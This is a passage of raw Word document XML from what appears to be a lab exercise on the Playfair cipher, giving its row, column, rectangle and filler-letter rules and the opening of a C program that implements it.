        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es and encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x- a. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers appear</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">w of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e, rep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ers </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="602" w:right="7278"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ght</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="640" w:right="980" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">b. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">appear on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e, rep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ers </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="640" w:right="78" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">c. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ers are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>fe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ws and co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ns, rep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ers on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e ro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="362" w:right="3034"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">d. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">wo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ers are sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>se f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e of one </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>9. D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ay </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext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ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>o.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7517"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt; vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>ze(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>Ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7041"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
